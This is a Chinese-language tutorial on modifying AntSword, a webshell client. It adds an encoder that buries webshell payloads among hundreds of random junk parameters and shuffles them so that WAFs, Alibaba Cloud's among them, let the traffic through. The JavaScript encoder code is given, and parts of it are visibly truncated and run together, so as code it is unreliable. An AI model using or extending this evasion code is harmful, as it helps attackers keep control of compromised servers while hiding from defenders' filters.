## 前言
本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。
因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二次开发可是不知如何下手。
不敢贸然称之为教程，只是把改造的过程发出来供大家借鉴，希望其他同学能够少走弯路。
## 正文
### 思路简介
大家都知道垃圾数据填充可以用于SQL注入的绕过，原理就是WAF在遇到大量的GET或者POST参数的时候就会直接把数据直接抛给后端，从而就可以绕过各种各样恶心的过滤，大家常常把这种方法叫做缓冲区溢出。
原因可能是WAF厂商考虑到防止自身程序对于流量分析时间过长，导致用户正常的业务无法访问，所以不得已直接丢给后端。因为咱也没看过WAF内部的规则是怎么写的，所以暂时这样猜想。
同样的，既然都是直接把数据抛给后端，那么这种办法是否可以用于一句话流量的绕过呢，答案当然是可以的，只不过要稍加修改。因为实际测试过程中发现，仅仅在payload前面加上超长字符串对于某里云来说并没有卵用，似乎已经免疫。但是换了个思路，发现改成增加大量垃圾键值对之后就可以bypass，那就暂且把这种方法叫做增加垃圾数据绕过法吧。
这篇文章主要介绍这种方法，以及如何把这个功能移植到蚁剑上。
### 编码器实现
这篇文章本来是几个月前发在自己的星球里，名字叫做`蚁剑编码器之流量混淆`。当时想着怎么方便怎么来，所以采用的是最简单、改动最小的一种实现方式--编码器实现。
这里全部采用了随机的方式来生成垃圾流量，随机变量名长度，随机变量值大小，随机变量个数。
    let varname_min = 5; //变量名最小长度
      let varname_max = 15; // 变量名最大长度
      let data_min = 200; // 变量值最小长度
      let data_max = 250; // 变量值最大长度
      let num_min = 150; // 变量最小个数
      let num_max = 250; // 变量最大个数
      function randomString(length) { // 生成随机字符串
        //let chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        let chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        let result = '';
        for (let i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
        return result;
      }
      function randomInt(min, max) {   //生成指定范围内的随机数
        return parseInt(Math.random() * (max - min + 1) + min, 10);
      }
      for (let i = 0; i  {
      let varname_min = 5;
      let varname_max = 15;
      let data_min = 200;
      let data_max = 250;
      let num_min = 100;
      let num_max = 200;
      let randomID = `_0x${Math.random().toString(16).substr(2)}`;
      data[randomID] = Buffer.from(data['_']).toString('base64');
      function randomString(length) {
        //let chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        let chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        let result = '';
        for (let i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
        return result;
      }
      function randomInt(min, max) {
        return parseInt(Math.random() * (max - min + 1) + min, 10);
      }
      for (let i = 0; i  { return Math.random() > 0.5 ? -1 : 1; })
      let finaldata={}
      tmparray.forEach(i => {
          finaldata[i]=dic[i]
    });
    return finaldata
    }
然后出现了点小插曲
因为`_postData`是const类型，不能直接修改
既然追求刺激，那就贯彻到底啦，直接改成let
再试一下就可以实现字典随机排序了
发现还可以正常使用，改了就改了吧
### asp测试
### aspx测试
asp,aspx类型的shell都可以正常使用
## 最后
参数个数可以根据实际情况自行修改，不过一般也不需要改，所以就没有写到UI中。
把参数个数改大可能会绕过更多waf，但是同样带来一个问题就是响应包会很慢，网络不好的情况下慎用。